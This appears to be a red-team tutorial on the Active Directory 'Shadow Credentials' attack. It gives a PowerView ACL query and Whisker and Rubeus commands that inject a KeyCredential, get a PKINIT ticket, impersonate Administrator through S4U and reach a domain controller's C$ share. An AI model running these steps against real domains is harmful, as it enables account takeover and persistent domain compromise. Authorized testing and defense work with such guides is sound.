
Microsoft introduced Windows Hello for Business (WHfB) to replace traditional password-based authentication with a key-trust model. The implementation uses a PIN or biometric gesture backed by a cryptographic key pair so domain users can access resources without relying on a classic password workflow. Users or computer accounts can have multiple key credentials tied to different devices. The data is stored in the Active Directory attribute `msDS-KeyCredentialLink`, introduced with Windows Server 2016 and Windows 10 1703.

If an attacker obtains write permissions over `msDS-KeyCredentialLink`, they can inject their own Key Credential into the target account (user or computer) and then authenticate as that identity through Kerberos PKINIT without knowing the password or hash. This is known as **Shadow Credentials**. It creates strong persistence because access is tied to the injected Key Credential in AD: even if the victim changes the password, the credential remains valid until it is explicitly removed. With that authentication, the attacker can request TGTs and often derive additional access, including credential recovery or follow-on abuse, while keeping durable control over sensitive identities.

- [ ] Requirements

You need write permissions over the target user/computer object in AD, such as `GenericWrite`, `GenericAll`, or `WriteProperty` on `msDS-KeyCredentialLink` (sometimes surfaced as `msDS-KeyCredentialLink/msDS-KeyCredential`).

```powershell
Get-DomainObjectAcl -Domain $targetDomain -ResolveGUIDs | ?{ $_.IsInherited -eq $false -and $_.ObjectAceType -eq "msDS-KeyCredentialLink" -and $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll" -and $_.IdentityReference -notmatch "NT AUTHORITY\\SYSTEM|BUILTIN\\Administrators|Domain Admins|Enterprise Admins"} | select ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectAceType
```

- [ ] Abuse

```text
Write access to msDS-KeyCredentialLink
↓
Whisker -> inject KeyCredential
↓
PKINIT -> TGT as the target account
↓
S4U -> impersonation (Administrator)
↓
TGS -> service access (for example CIFS/DC)
↓
Domain Controller compromise
```

1. Add a Shadow Credential (KeyCredential Injection)

The attacker has write access over the target object's `msDS-KeyCredentialLink` attribute.

```powershell
# Computer account (DC)
.\Whisker.exe add /target:dc$ /domain:domain.com /dc:1.2.3.4

# User account
.\Whisker.exe add /target:ada /domain:domain.com /dc:1.2.3.4
```

- Generates a public/private key pair (`cert.pfx` + PFX password)
- Creates a `KeyCredential`
- Adds it to `msDS-KeyCredentialLink`

> This creates a new way to authenticate as that identity **without** knowing its password, and it remains until removed.

2. Verify Persistence

```powershell
# Computer
.\Whisker.exe list /target:dc$

# User
Get-DomainUser -Identity ada -Properties msDS-KeyCredentialLink | select samaccountname,msDS-KeyCredentialLink
```

3. Obtain a TGT as the Target Account (PKINIT)

```powershell
# Using a PFX file
.\Rubeus.exe asktgt /user:dc$ /certificate:cert.pfx /password:<PFX_PASSWORD> /domain:domain.local /dc:dc01.domain.local /ptt /nowrap

# Alternative (Base64)
.\Rubeus.exe asktgt /user:dc$ /certificate:<BASE64_CERT> /password:<PFX_PASSWORD> /domain:domain.local /dc:dc01.domain.local /ptt /nowrap
```

- PKINIT-based authentication
- The KDC issues a valid TGT
- The ticket is injected into memory with `/ptt`

> At this point you are operating as `dc$`.

4. Abuse S4U to Impersonate a Privileged User

This allows you to obtain service tickets as `Administrator`, for example to CIFS on the DC.

```powershell
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/dc.domain.local /dc:dc.domain.local /ptt /ticket:<TGT>
```

5. Access the Domain Controller

```powershell
dir \\dc.domain.local\c$
```

6. Cleanup

```powershell
# Computer
.\Whisker.exe remove /target:dc$

# User
.\Whisker.exe remove /target:ada
```
